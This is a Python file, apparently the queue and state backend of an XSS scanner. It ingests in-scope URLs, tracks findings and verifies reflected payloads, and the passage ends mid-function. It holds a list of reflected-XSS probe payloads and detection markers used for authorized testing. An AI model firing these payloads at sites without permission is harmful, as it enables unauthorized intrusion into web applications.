#!/usr/bin/env python3
"""xss-queue.py - authoritative state for xss-scan.sh (v13).

Execution proof contract:
  * every verification attempt gets a random token XSS_CONFIRMED_<hex12>
  * the injected payload never contains that token literally; it builds it with
    String.fromCharCode(...) inside the browser
  * confirmation requires the exact token in a rendered attribute
    (data-pwn="<token>") or as an exact extracted-results entry
  => a reflected request/response can never manufacture the token, and token
     comparison is exact (no substring/prefix collisions)

Scope contract:
  * every outbound request (page fetch, form action, JSON spec, body probe)
    is checked against the same (host, port) allowlist used for URL ingestion
  * redirects are never followed; a 3xx is recorded, not traversed

Subcommands: see `xss-queue.py --help` (printed on no args).
"""

import json
import os
import re
import secrets
import sqlite3
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from html.parser import HTMLParser
from urllib.parse import parse_qsl, quote, urlsplit, urlunsplit

STATIC = (".js", ".css", ".map", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico",
          ".woff", ".woff2", ".ttf", ".eot", ".pdf", ".zip", ".gz", ".mp4",
          ".webp", ".avif")
EXCLUDE_STATIC = os.environ.get("EXCLUDE_STATIC", "1") != "0"
PROBE_TIMEOUT = int(os.environ.get("PROBE_TIMEOUT", "10"))
PROBE_HEADERS = json.loads(os.environ.get("PROBE_HEADERS", "[]") or "[]")
SCOPE_FILE = os.environ.get("XSS_SCOPE_HOSTS", "")
MAX_BODY_PARAMS = int(os.environ.get("MAX_BODY_PARAMS", "8"))

_ALL_PAYLOADS = [
    # space-form tags first: many filters block "/onload" but allow " onload"
    '<svg onload=alert(1)>',
    '<svg onload=alert(document.domain)>',
    '<img src=x onerror=alert(1)>',
    '"><svg/onload=alert(1)>',
    "'><svg/onload=alert(1)>",
    '"><img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '</script><script>alert(1)</script>',
    '<svg/onload=alert(1)>',
    '"><link rel="x" href="',
]
# fast default: 8 payloads; XSS_FULL_PAYLOADS=1 for all
BODY_PAYLOADS = _ALL_PAYLOADS if os.environ.get("XSS_FULL_PAYLOADS") == "1" else _ALL_PAYLOADS[:8]
RAW_MARKERS = ("<svg onload=", "<svg/onload=", "<img src=x onerror=",
               "</script><svg/onload=", "<script>alert(", "</script><script>",
               '<link rel="x" href="')
MANUAL_TEMPLATES = ("reflected-body-xss",)
COMMON_PARAMS = ["p", "q", "id", "page", "site", "url", "file", "name",
                 "search", "query", "level", "product", "version"]
TOKEN_RE = re.compile(r"XSS_CONFIRMED_[0-9a-f]{12}")


def connect(path):
    c = sqlite3.connect(path, timeout=60, isolation_level=None)
    c.execute("PRAGMA journal_mode=WAL")
    c.execute("PRAGMA synchronous=FULL")
    c.execute("PRAGMA busy_timeout=30000")
    return c


SCHEMA = [
    """CREATE TABLE IF NOT EXISTS urls(
        id INTEGER PRIMARY KEY, url TEXT UNIQUE NOT NULL,
        state TEXT NOT NULL DEFAULT 'pending', tries INTEGER NOT NULL DEFAULT 0)""",
    "CREATE INDEX IF NOT EXISTS idx_urls_state ON urls(state, id)",
    """CREATE TABLE IF NOT EXISTS jsurls(
        url TEXT PRIMARY KEY, state TEXT NOT NULL DEFAULT 'pending')""",
    """CREATE TABLE IF NOT EXISTS discovery(
        source TEXT, key TEXT, status TEXT, rc INTEGER, ts TEXT,
        PRIMARY KEY(source, key))""",
    """CREATE TABLE IF NOT EXISTS jobs(
        id INTEGER PRIMARY KEY, kind TEXT NOT NULL, target TEXT NOT NULL,
        state TEXT NOT NULL DEFAULT 'pending', tries INTEGER NOT NULL DEFAULT 0,
        UNIQUE(kind, target))""",
    "CREATE INDEX IF NOT EXISTS idx_jobs_state ON jobs(kind, state, id)",
    """CREATE TABLE IF NOT EXISTS findings(
        id INTEGER PRIMARY KEY, template_id TEXT NOT NULL, url TEXT NOT NULL,
        param TEXT, sig TEXT NOT NULL DEFAULT '', json TEXT NOT NULL, created TEXT,
        config_id TEXT NOT NULL DEFAULT '',
        UNIQUE(template_id, url, param, sig))""",
    """CREATE TABLE IF NOT EXISTS attempts(
        id INTEGER PRIMARY KEY, finding_id INTEGER, candidate TEXT NOT NULL,
        param_index INTEGER, param_name TEXT, variant INTEGER, injected TEXT,
        token TEXT NOT NULL, state TEXT NOT NULL DEFAULT 'pending', rc INTEGER,
        evidence TEXT, proof TEXT, strategy TEXT DEFAULT '', batch INTEGER)""",
    "CREATE INDEX IF NOT EXISTS idx_attempts_state ON attempts(state, id)",
    """CREATE TABLE IF NOT EXISTS observations(
        finding_id INTEGER NOT NULL, config_id TEXT NOT NULL DEFAULT '',
        template_id TEXT, param TEXT, first_seen TEXT, last_seen TEXT, hits INTEGER DEFAULT 1,
        evidence TEXT NOT NULL DEFAULT '', PRIMARY KEY(finding_id, config_id))""",
    "CREATE UNIQUE INDEX IF NOT EXISTS idx_attempts_token ON attempts(token)",
    "CREATE TABLE IF NOT EXISTS meta(k TEXT PRIMARY KEY, v TEXT)",
]

MIGRATE_FINDINGS = """
CREATE TABLE findings_v7(
    id INTEGER PRIMARY KEY, template_id TEXT NOT NULL, url TEXT NOT NULL,
    param TEXT, sig TEXT NOT NULL DEFAULT '', json TEXT NOT NULL, created TEXT,
    UNIQUE(template_id, url, param, sig));
INSERT OR IGNORE INTO findings_v7(template_id,url,param,sig,json,created)
    SELECT template_id,url,param,'',json,created FROM findings;
DROP TABLE findings;
ALTER TABLE findings_v7 RENAME TO findings;
"""


def ensure(c):
    for stmt in SCHEMA:
        try:
            c.execute(stmt)
        except sqlite3.OperationalError:
            pass
    cols = [r[1] for r in c.execute("PRAGMA table_info(findings)")]
    if "sig" not in cols:
        c.executescript(MIGRATE_FINDINGS)
    ocols = [r[1] for r in c.execute("PRAGMA table_info(observations)")]
    if "evidence" not in ocols and ocols:
        try:
            c.execute("ALTER TABLE observations ADD COLUMN evidence TEXT NOT NULL DEFAULT ''")
        except sqlite3.OperationalError:
            pass
    if "config_id" not in cols:
        try:
            c.execute("ALTER TABLE findings ADD COLUMN config_id TEXT NOT NULL DEFAULT ''")
        except sqlite3.OperationalError:
            pass
    if "context" not in cols:
        try:
            c.execute("ALTER TABLE findings ADD COLUMN context TEXT NOT NULL DEFAULT ''")
        except sqlite3.OperationalError:
            pass
    acols = [r[1] for r in c.execute("PRAGMA table_info(attempts)")]
    for col, ddl in (("finding_id", "INTEGER"), ("batch", "INTEGER"), ("proof", "TEXT"), ("strategy", "TEXT")):
        if col not in acols:
            c.execute("ALTER TABLE attempts ADD COLUMN %s %s" % (col, ddl))


def now():
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())


def meta_set(c, k, v):
    c.execute("INSERT INTO meta(k,v) VALUES(?,?) ON CONFLICT(k) DO UPDATE SET v=excluded.v",
              (k, str(v)))


def meta_get(c, k, default=None):
    row = c.execute("SELECT v FROM meta WHERE k=?", (k,)).fetchone()
    return row[0] if row else default


# ------------------------------------------------------------------ scope layer
def load_policy(hosts_file):
    allowed = set()
    if not hosts_file or not os.path.exists(hosts_file):
        return allowed
    with open(hosts_file, encoding="utf-8", errors="replace") as fh:
        for line in fh:
            entry = line.strip().lower().rstrip(".")
            if not entry:
                continue
            host, port = None, None
            if "://" in entry:
                try:
                    sp = urlsplit(entry)
                    host, port = sp.hostname, sp.port
                except ValueError:
                    continue
            elif entry.count(":") == 1:
                h, p = entry.rsplit(":", 1)
                if p.isdigit():
                    host, port = h, int(p)
            if host is None:
                host = entry
            if not host:
                continue
            if port:
                allowed.add((host, int(port)))
            else:
                allowed.add((host, 80))
                allowed.add((host, 443))
    return allowed


def split_url(u):
    try:
        sp = urlsplit(u)
        return sp, sp.port
    except ValueError:
        return None, None


def in_scope(u, allowed):
    if not allowed:
        return False
    sp, port = split_url(u)
    if sp is None or sp.scheme not in ("http", "https") or not sp.hostname:
        return False
    host = sp.hostname.lower().rstrip(".")
    if port is None:
        port = 443 if sp.scheme == "https" else 80
    return (host, port) in allowed


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None  # never follow


OPENER = urllib.request.build_opener(NoRedirect)
_TLS = threading.local()


def _opener():
    op = getattr(_TLS, "op", None)
    if op is None:
        op = urllib.request.build_opener(NoRedirect)
        _TLS.op = op
    return op


def _headers():
    h = {"User-Agent": os.environ.get(
        "XSS_UA",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0"),
         "Accept": os.environ.get(
             "XSS_ACCEPT",
             "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")}
    for item in PROBE_HEADERS:
        if ":" in item:
            k, v = item.split(":", 1)
            h[k.strip()] = v.strip()
    return h


def http_request(url, allowed, method="GET", data=None, ctype=None):
    """Single request with scope enforcement and no redirect following."""
    out = {"url": url, "status": 0, "error": "", "ctype": "", "body": "",
           "redirect": ""}
    if not in_scope(url, allowed):
        out["error"] = "out_of_scope"
        return out
    headers = _headers()
    if ctype:
        headers["Content-Type"] = ctype
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with _opener().open(req, timeout=PROBE_TIMEOUT) as r:
            out["status"] = getattr(r, "status", r.getcode())
            out["ctype"] = r.headers.get("Content-Type", "")
            out["body"] = r.read(400000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        out["status"] = e.code
        out["ctype"] = e.headers.get("Content-Type", "") if e.headers else ""
        if e.code in (301, 302, 303, 307, 308):
            out["redirect"] = e.headers.get("Location", "") if e.headers else ""
            out["error"] = "redirect_not_followed"
            return out
        try:
            out["body"] = e.read(400000).decode("utf-8", "replace")
        except Exception:
            pass
    except Exception as exc:
        out["error"] = type(exc).__name__
    return out


# ------------------------------------------------------------------ url ingest
def cmd_init(db):
    c = connect(db)
    ensure(c)
    print("[*] queue ready:", db)


def cmd_ingest(db, hosts_file, max_total="0"):
    allowed = load_policy(hosts_file)
    max_total = int(max_total or 0)
    c = connect(db)
    ensure(c)
    st = {"inserted": 0, "duplicate": 0, "out_of_scope": 0, "static": 0,
          "no_query": 0, "dropped_by_cap": 0, "bad_url": 0}
    buffer, buffered = [], set()
    unique_now = c.execute("SELECT COUNT(*) FROM urls").fetchone()[0]

    def flush():
        nonlocal unique_now
        if not buffer:
            return
        c.execute("BEGIN IMMEDIATE")
        before = c.total_changes
        c.executemany("INSERT OR IGNORE INTO urls(url) VALUES(?)",
                      [(u,) for u in buffer])
        c.execute("COMMIT")
        added = c.total_changes - before
        st["inserted"] += added
        st["duplicate"] += len(buffer) - added
        unique_now += added
        buffer.clear()
        buffered.clear()

    for raw in sys.stdin:
        u = raw.strip()
        if not u:
            continue
        sp, port = split_url(u)
        if sp is None or sp.scheme not in ("http", "https") or not sp.hostname:
            st["bad_url"] += 1
            continue
        host = sp.hostname.lower().rstrip(".")
        if port is None:
            port = 443 if sp.scheme == "https" else 80
        if (host, port) not in allowed:
            st["out_of_scope"] += 1
            continue
        if sp.path.lower().endswith((".js", ".mjs")):
            # bundles are not scan targets, but they are endpoint sources
            c.execute("INSERT OR IGNORE INTO jsurls(url) VALUES(?)", (u,))
            st["static"] += 1
            continue
        if EXCLUDE_STATIC and sp.path.lower().endswith(STATIC):
            st["static"] += 1
            continue
        if "?" not in u:
            st["no_query"] += 1
            room = _jobs_room(c)
            if room is None or room > 0:
                c.execute("BEGIN IMMEDIATE")
                c.execute("INSERT OR IGNORE INTO jobs(kind,target,state)"
                          " VALUES('path',?,'pending')", (u,))
                c.execute("COMMIT")
            continue
        if u in buffered:
            st["duplicate"] += 1
            continue
        if max_total and (unique_now + len(buffered)) >= max_total:
            flush()
            if c.execute("SELECT 1 FROM urls WHERE url=?", (u,)).fetchone():
                st["duplicate"] += 1
                continue
            if unique_now >= max_total:
                c.execute("BEGIN IMMEDIATE")
                c.execute("INSERT OR IGNORE INTO urls(url,state) VALUES(?,'deferred')", (u,))
                c.execute("COMMIT")
                st["dropped_by_cap"] += 1
                continue
        buffer.append(u)
        buffered.add(u)
        if len(buffer) >= 500:
            flush()
    flush()
    print("[*] ingest: " + ", ".join("%s=%d" % kv for kv in st.items()), file=sys.stderr)


# ------------------------------------------------------------------- claiming
def _claim_rows(c, sql, args, n):
    c.execute("BEGIN IMMEDIATE")
    rows = c.execute(sql, args + (n,)).fetchall()
    ids = [r[0] for r in rows]
    return rows, ids


def cmd_batch(db, n, out_file):
    n = int(n)
    c = connect(db)
    ensure(c)
    rows, ids = _claim_rows(
        c, "SELECT id, url FROM urls WHERE state='pending' ORDER BY id LIMIT ?", (), n)
    with open(out_file, "w", encoding="utf-8") as fh:
        for _, url in rows:
            fh.write(url + "\n")
    if ids:
        c.executemany("UPDATE urls SET state='inflight' WHERE id=?", [(i,) for i in ids])
    c.execute("COMMIT")
    print(len(rows))


def _claim(db, kinds, n, out_file):
    n = int(n)
    c = connect(db)
    ensure(c)
    ph = ",".join("?" for _ in kinds)
    rows, ids = _claim_rows(
        c, "SELECT id, target FROM jobs WHERE kind IN (%s) AND state='pending'"
           " ORDER BY id LIMIT ?" % ph, tuple(kinds), n)
    with open(out_file, "w", encoding="utf-8") as fh:
        for _, target in rows:
            fh.write(target + "\n")
    with open(out_file + ".ids", "w", encoding="utf-8") as ih:
        for jid in ids:
            ih.write("%d\n" % jid)
    if ids:
        c.executemany("UPDATE jobs SET state='running' WHERE id=?", [(i,) for i in ids])
    c.execute("COMMIT")
    print(len(rows))


# ------------------------------------------------------------------- findings
class OutputError(Exception):
    pass


def _vuln_param(url, rec):
    """Prefer the template's own injection point over the whole query list."""
    for key in ("param", "parameter", "injection-point", "injection_point"):
        val = rec.get(key)
        if isinstance(val, str) and val:
            return val
    try:
        segs = _query_segments(url)
    except Exception:
        segs = []
    marked = [name for _, name, value in segs
              if any(t in value for t in ("%3C", "%3c", "<", "onerror", "svg", "alert"))]
    if len(marked) == 1:
        return marked[0]
    if marked:
        return ",".join(marked)
    return ",".join(name for _, name, _ in segs)


def _findings_from(jsonl_path, strict=True):
    if not jsonl_path or not os.path.exists(jsonl_path):
        if strict:
            raise OutputError("result file missing: %s" % jsonl_path)
        return [], 0
    rows, bad = [], 0
    with open(jsonl_path, encoding="utf-8", errors="replace") as fh:
        for line in fh:
            line = line.strip()
            if not line:
                continue
            try:
                d = json.loads(line)
            except Exception:
                bad += 1
                continue
            url = d.get("matched-at") or d.get("url")
            if not url:
                bad += 1
                continue
            tid = d.get("template-id") or "unknown"
            param = _vuln_param(url, d)
            idx = d.get("param_index")
            sig = "%s|%s|%s|%s" % (d.get("matcher-name") or "",
                                   d.get("extractor-name") or "",
                                   d.get("type") or "",
                                   "^" if idx is None else str(idx))
            rows.append((tid, url, param, sig, json.dumps(d, separators=(",", ":"))))
    if bad and strict:
        raise OutputError("%d malformed record(s) in %s" % (bad, jsonl_path))
    return rows, bad


def _insert_findings(c, rows, config_id=""):
    added = 0
    for tid, url, param, sig, blob in rows:
        before = c.total_changes
        c.execute("INSERT OR IGNORE INTO findings(template_id,url,param,sig,json,created,"
                  "config_id) VALUES(?,?,?,?,?,?,?)",
                  (tid, url, param, sig, blob, now(), config_id))
        added += c.total_changes - before
        row = c.execute("SELECT id FROM findings WHERE template_id=? AND url=? AND param=?"
                        " AND sig=?", (tid, url, param, sig)).fetchone()
        if row:
            fid = row[0]
            c.execute("INSERT INTO observations(finding_id,config_id,template_id,param,"
                      "first_seen,last_seen,hits,evidence) VALUES(?,?,?,?,?,?,1,?)"
                      " ON CONFLICT(finding_id,config_id) DO UPDATE SET"
                      " last_seen=excluded.last_seen, hits=hits+1,"
                      " evidence=excluded.evidence",
                      (fid, config_id, tid, param, now(), now(), blob[:2000]))
    return added


def _config_id(c):
    return meta_get(c, "config_id", "") or ""


def cmd_commit_batch(db, batch_file, jsonl_file):
    c = connect(db)
    ensure(c)
    urls = [l.rstrip("\n") for l in open(batch_file, encoding="utf-8", errors="replace")]
    urls = [u for u in urls if u]
    try:
        rows, _ = _findings_from(jsonl_file, strict=True)
    except OutputError as exc:
        print("[-] commit-batch rejected: %s" % exc, file=sys.stderr)
        return 1
    try:
        c.execute("BEGIN IMMEDIATE")
        added = _insert_findings(c, rows, _config_id(c))
        c.executemany("UPDATE urls SET state='done' WHERE url=?", [(u,) for u in urls])
        c.execute("COMMIT")
    except Exception as exc:
        try:
            c.execute("ROLLBACK")
        except Exception:
            pass
        print("[-] commit-batch failed: %s" % exc, file=sys.stderr)
        return 1
    print("[*] batch committed: %d url(s), %d finding(s), %d new"
          % (len(urls), len(rows), added), file=sys.stderr)
    return 0


def _mark_urls(db, batch_file, state, bump=False):
    c = connect(db)
    urls = [l.rstrip("\n") for l in open(batch_file, encoding="utf-8", errors="replace")]
    urls = [u for u in urls if u]
    c.execute("BEGIN IMMEDIATE")
    c.executemany("UPDATE urls SET state=?, tries=tries+? WHERE url=?",
                  [(state, 1 if bump else 0, u) for u in urls])
    c.execute("COMMIT")
    print("[*] %d url(s) -> %s" % (len(urls), state), file=sys.stderr)


def cmd_add_findings(db, jsonl_file):
    c = connect(db)
    ensure(c)
    try:
        rows, _ = _findings_from(jsonl_file, strict=True)
    except OutputError as exc:
        print("[-] add-findings rejected: %s" % exc, file=sys.stderr)
        return 1
    c.execute("BEGIN IMMEDIATE")
    added = _insert_findings(c, rows, _config_id(c))
    c.execute("COMMIT")
    print("[*] add-findings: %d new of %d" % (added, len(rows)), file=sys.stderr)
    return 0


# ------------------------------------------------------------------ discovery
def cmd_discovery_set(db, source, key, status, rc="0"):
    c = connect(db)
    ensure(c)
    c.execute("INSERT INTO discovery(source,key,status,rc,ts) VALUES(?,?,?,?,?)"
              " ON CONFLICT(source,key) DO UPDATE SET status=excluded.status,"
              " rc=excluded.rc, ts=excluded.ts", (source, key, status, int(rc), now()))


def cmd_discovery_status(db, source, key):
    c = connect(db)
    ensure(c)
    row = c.execute("SELECT status FROM discovery WHERE source=? AND key=?",
                    (source, key)).fetchone()
    print(row[0] if row else "none")


def cmd_discovery_done(db, source):
    c = connect(db)
    ensure(c)
    for (k,) in c.execute("SELECT key FROM discovery WHERE source=? AND status='done'",
                          (source,)):
        print(k)


def cmd_discovery_pending(db):
    c = connect(db)
    ensure(c)
    for s, k in c.execute("SELECT source,key FROM discovery WHERE status!='done'"):
        print("%s\t%s" % (s, k))


# -------------------------------------------------------------------- jobs
def _ids(id_file):
    return [int(x) for x in open(id_file, encoding="utf-8").read().split() if x.strip()]


def _jobs_cap(c):
    try:
        return int(meta_get(c, "jobs_cap", "0") or 0)
    except ValueError:
        return 0


def _jobs_room(c):
    cap = _jobs_cap(c)
    if cap <= 0:
        return None
    have = c.execute("SELECT COUNT(*) FROM jobs"
                     " WHERE state IN ('pending','running','failed')").fetchone()[0]
    return max(0, cap - have)


def cmd_promote_jobs(db):
    c = connect(db)
    ensure(c)
    promoted = 0
    while True:
        room = _jobs_room(c)
        if room is not None and room <= 0:
            break
        rows = c.execute("SELECT id FROM jobs WHERE state='deferred' ORDER BY id LIMIT ?",
                         ((room if room is not None else 500),)).fetchall()
        if not rows:
            break
        c.execute("BEGIN IMMEDIATE")
        c.executemany("UPDATE jobs SET state='pending' WHERE id=?", [(r[0],) for r in rows])
        c.execute("COMMIT")
        promoted += len(rows)
    left = c.execute("SELECT COUNT(*) FROM jobs WHERE state='deferred'").fetchone()[0]
    print("[*] promoted %d deferred job(s), %d still deferred" % (promoted, left),
          file=sys.stderr)
    return 0


def cmd_list_targets(db, out_file):
    """In-scope http(s) targets discovered so far, for form discovery."""
    c = connect(db)
    ensure(c)
    seen = set()
    rows = []
    for (u,) in c.execute("SELECT url FROM urls ORDER BY id"):
        base = u.split("?", 1)[0]
        if base not in seen:
            seen.add(base)
            rows.append(base)
    for (t,) in c.execute("SELECT target FROM jobs WHERE kind='path' ORDER BY id"):
        if t not in seen:
            seen.add(t)
            rows.append(t)
    with open(out_file, "w", encoding="utf-8") as fh:
        for u in rows:
            fh.write(u + "\n")
    print(len(rows))


def _row_from_line(line):
    line = line.strip()
    if not line:
        return None
    try:
        d = json.loads(line)
    except Exception:
        return None
    url = d.get("matched-at") or d.get("url")
    if not url:
        return None
    tid = d.get("template-id") or "unknown"
    param = _vuln_param(url, d)
    idx = d.get("param_index")
    sig = "%s|%s|%s|%s" % (d.get("matcher-name") or "",
                           d.get("extractor-name") or "",
                           d.get("type") or "",
                           "^" if idx is None else str(idx))
    return (tid, url, param, sig, json.dumps(d, separators=(",", ":")))


def _encoded_forms(marker):
    """Same payload with HTML/JS escaping applied, i.e. harmless text."""
    forms = set()
    subs = [("&", "&amp;"), ("<", "&lt;"), (">", "&gt;"),
            ('"', "&quot;"), ("'", "&#x27;"), ("'", "&#39;"), ("'", "&#039;")]
    out = marker
    for a, b in subs:
        out = out.replace(a, b)
    forms.add(out)
    js = marker
    for ch in ("<", ">", "'", '"', "&"):
        js = js.replace(ch, "\\u%04x" % ord(ch))
    forms.add(js)
    return forms


def _only_escaped(markers, body):
    """True when every marker appears only in an encoded form."""
    for m in markers:
        if m in body:
            return False
        if not any(f in body for f in _encoded_forms(m)):
            return False
    return True


def _ctx_survives(allowed, url, tid, markers):
    """Same verdict as ctxfilter: true when the payload can actually execute."""
    if tid in MANUAL_TEMPLATES or not markers:
        return True, "unknown"
    res = http_request(url, allowed, "GET")
    if res["error"] or not res["body"]:
        return True, "unreachable"
    if "html" not in (res["ctype"] or "").lower():
        # text/plain, application/json, XML ...: reflection is not execution
        return False, "non_html"
    body = res["body"]
    stripped = re.sub(r"<script[^>]*type=[\"']application/(?:ld\+)?json[\"'][^>]*>.*?</script>",
                      "", body, flags=re.I | re.S)
    stripped = re.sub(r"<script[^>]*id=[\"']__NEXT_DATA__[\"'][^>]*>.*?</script>",
                      "", stripped, flags=re.I | re.S)
    for pat in (r"<!--.*?-->", r"<textarea\b.*?</textarea>", r"<title\b.*?</title>",
                r"<xmp\b.*?</xmp>", r"<noscript\b.*?</noscript>", r"<style\b.*?</style>"):
        stripped = re.sub(pat, "", stripped, flags=re.I | re.S)
    if any(m in stripped for m in markers):
        return True, "html"
    if _only_escaped(markers, stripped):
        return False, "escaped"
    if any(m in body for m in markers):
        return False, "json"
    return True, "unknown"


def cmd_live_watch(db, jsonl_file, offset_file, label="hit", parent_pid="0"):
    """Emit findings the moment nuclei writes them, then keep watching.

    Keeps a byte offset so each record is handled once. Each new finding goes
    through the same context check as ctxfilter, so JSON-blob reflections are
    never printed. Stops when the parent process exits and the file is drained.
    """
    import time as _time
    allowed = load_policy(SCOPE_FILE)
    if not allowed:
        return 2
    c = connect(db)
    ensure(c)
    cfg = _config_id(c)
    try:
        ppid = int(parent_pid)
    except Exception:
        ppid = 0
    try:
        off = int(open(offset_file).read().strip() or 0)
    except Exception:
        off = 0
    carry = b""
    while True:
        grew = False
        try:
            size = os.path.getsize(jsonl_file)
        except OSError:
            size = 0
        if size > off:
            with open(jsonl_file, "rb") as fh:
                fh.seek(off)
                chunk = fh.read()
            off += len(chunk)
            grew = True
        else:
            chunk = b""
        data = carry + chunk
        if b"\n" in data:
            head, carry = data.rsplit(b"\n", 1)
            lines = head.decode("utf-8", "replace").split("\n")
        else:
            carry = data
            lines = []
        for line in lines:
            row = _row_from_line(line)
            if not row:
                continue
            tid, url, param, sig, blob = row
            max_before = c.execute("SELECT COALESCE(MAX(id),0) FROM findings").fetchone()[0]
            c.execute("BEGIN IMMEDIATE")
            _insert_findings(c, [row], cfg)
            c.execute("COMMIT")
            fid = c.execute("SELECT id FROM findings WHERE template_id=? AND url=?"
                            " AND param=? AND sig=?", (tid, url, param, sig)).fetchone()
            fid = fid[0] if fid else None
            if fid is None or fid <= max_before:
                continue  # duplicate: already seen in an earlier batch or pass
            try:
                sp = urlsplit(url)
                values = [v for _, v in parse_qsl(sp.query, keep_blank_values=True)]
            except Exception:
                values = []
            markers = [v for v in values if len(v) > 3 and any(
                t in v.lower() for t in ("<", "alert(", "onerror", "onmouseover",
                                         "svg", "script", "javascript:"))]
            ok, ctx = _ctx_survives(allowed, url, tid, markers)
            if fid is not None:
                c.execute("UPDATE findings SET context=? WHERE id=?", (ctx, fid))
            if not ok:
                continue
            p = (" param=" + param) if param else ""
            print("[+] XSS %s: %s%s  [%s]" % (label, url, p, tid), flush=True)
        # advance the shared marker so the post-batch pass never repeats a line
        top = c.execute("SELECT COALESCE(MAX(id),0) FROM findings").fetchone()[0]
        prev = int(meta_get(c, "shown_finding_id", "0") or 0)
        if top > prev:
            meta_set(c, "shown_finding_id", top)
        if not grew:
            if ppid:
                try:
                    os.kill(ppid, 0)
                except OSError:
                    # parent gone: one last read, then finish
                    try:
                        size = os.path.getsize(jsonl_file)
                    except OSError:
                        size = 0
                    if size <= off:
                        break
                    continue
            _time.sleep(1)
        if ppid == 0 and not grew:
            break
    try:
        with open(offset_file, "w") as fh:
            fh.write(str(off))
    except Exception:
        pass
    return 0


def _host_key(u):
    """Lowercased hostname for a URL or bare host:port entry."""
    u = (u or "").strip()
    if not u:
        return ""
    if "://" not in u:
        u = "http://" + u
    try:
        sp = urlsplit(u)
        host = (sp.hostname or "").lower().rstrip(".")
        port = sp.port
        if port and port not in (80, 443):
            return "%s:%d" % (host, port)
        return host
    except Exception:
        return ""


def _append_unique(dst, src, key=None):
    """Append lines from src to dst, skipping ones already present."""
    seen = set()
    if os.path.exists(dst):
        with open(dst, encoding="utf-8", errors="replace") as fh:
            for line in fh:
                line = line.rstrip("\n")
                if line:
                    seen.add(key(line) if key else line)
    added = 0
    if os.path.exists(src):
        with open(dst, "a", encoding="utf-8") as out, \
                open(src, encoding="utf-8", errors="replace") as fh:
            for line in fh:
                line = line.rstrip("\n")
                if not line:
                    continue
                k = key(line) if key else line
                if k in seen:
                    continue
                seen.add(k)
                out.write(line + "\n")
                added += 1
    return added


def cmd_merge_run(child_dir, parent_dir):
    """Fold one per-host part into the parent run, then the caller deletes it.

    Keeps the parent small: aggregates of findings, confirmations, request
    dumps, and completed-host lists only. No queue databases are copied.
    """
    if not os.path.isdir(child_dir):
        print("[-] merge-run: missing %s" % child_dir, file=sys.stderr)
        return 1
    os.makedirs(parent_dir, exist_ok=True)
    os.makedirs(os.path.join(parent_dir, "requests"), exist_ok=True)
    parent_logs = os.path.join(parent_dir, "logs")
    os.makedirs(parent_logs, exist_ok=True)

    res = _append_unique(os.path.join(parent_dir, "results.jsonl"),
                         os.path.join(child_dir, "results.jsonl"))
    conf = _append_unique(os.path.join(parent_dir, "confirmed.jsonl"),
                          os.path.join(child_dir, "confirmed.jsonl"))
    _append_unique(os.path.join(parent_dir, "verify-report.jsonl"),
                   os.path.join(child_dir, "verify-report.jsonl"))
    hosts = _append_unique(os.path.join(parent_dir, "hosts-done.txt"),
                           os.path.join(child_dir, "hosts-done.txt"))
    urls_done = _append_unique(os.path.join(parent_dir, "urls-done.txt"),
                               os.path.join(child_dir, "urls-done.txt"))

    # preserve the child's run log: append into the parent log, never deleted
    child_notify = os.path.join(child_dir, "logs", "notify.log")
    if os.path.isdir(parent_logs) and os.path.exists(child_notify):
        dest = os.path.join(parent_logs, "notify.log")
        tag = os.path.basename(child_dir.rstrip("/\\"))
        try:
            with open(dest, "a", encoding="utf-8", errors="replace") as out, \
                    open(child_notify, encoding="utf-8", errors="replace") as fh:
                out.write("\n===== part %s notify =====\n" % tag)
                for line in fh:
                    out.write(line)
        except OSError:
            pass

    child_runlog = os.path.join(child_dir, "logs", "run.log")
    parent_logs = os.path.join(parent_dir, "logs")
    if os.path.isdir(parent_logs) and os.path.exists(child_runlog):
        dest = os.path.join(parent_logs, "run.log")
        tag = os.path.basename(child_dir.rstrip("/\\"))
        try:
            with open(dest, "a", encoding="utf-8", errors="replace") as out, \
                    open(child_runlog, encoding="utf-8", errors="replace") as fh:
                out.write("\n===== part %s log =====\n" % tag)
                for line in fh:
                    out.write(line)
        except OSError:
            pass

    # request dumps keep unique names so nothing is overwritten
    src_req = os.path.join(child_dir, "requests")
    if os.path.isdir(src_req):
        tag = os.path.basename(child_dir.rstrip("/\\"))
        for name in os.listdir(src_req):
            src = os.path.join(src_req, name)
            if not os.path.isfile(src):
                continue
            dst = os.path.join(parent_dir, "requests", tag + "-" + name)
            if not os.path.exists(dst):
                try:
                    with open(src, "rb") as fh, open(dst, "wb") as out:
                        out.write(fh.read())
                except OSError:
                    pass

    log = os.path.join(parent_dir, "hosts-completed.log")
    seen = set()
    if os.path.exists(log):
        with open(log, encoding="utf-8", errors="replace") as fh:
            for line in fh:
                parts = line.split()
                if len(parts) >= 2:
                    seen.add(parts[-1])
    child_log = os.path.join(child_dir, "hosts-completed.log")
    if os.path.exists(child_log):
        with open(log, "a", encoding="utf-8") as out, \
                open(child_log, encoding="utf-8", errors="replace") as fh:
            for line in fh:
                parts = line.split()
                if len(parts) >= 2 and parts[-1] not in seen:
                    seen.add(parts[-1])
                    out.write(line if line.endswith("\n") else line + "\n")

    # aggregate counters into a single parent coverage.json
    agg = {}
    cov_parent = os.path.join(parent_dir, "coverage.json")
    if os.path.exists(cov_parent):
        try:
            agg = json.load(open(cov_parent, encoding="utf-8"))
        except Exception:
            agg = {}
    parts = agg.get("parts", {})
    complete = True
    child_cov = os.path.join(child_dir, "coverage.json")
    if os.path.exists(child_cov):
        try:
            cov = json.load(open(child_cov, encoding="utf-8"))
            tid = os.path.basename(child_dir.rstrip("/\\"))
            ok = bool(cov.get("complete"))
            if not ok and cov.get("work_complete") and not cov.get("verification_requested"):
                ok = True  # scan work finished; verification simply not requested
            parts[tid] = {"complete": ok,
                          "findings": cov.get("findings", 0),
                          "confirmed_candidates": cov.get("confirmed_candidates", 0),
                          "discovery_failed": bool(cov.get("discovery_failed_sources")),
                          "forms_failed": cov.get("forms_pages_failed", 0)}
            if not ok:
                complete = False
        except Exception:
            pass
    else:
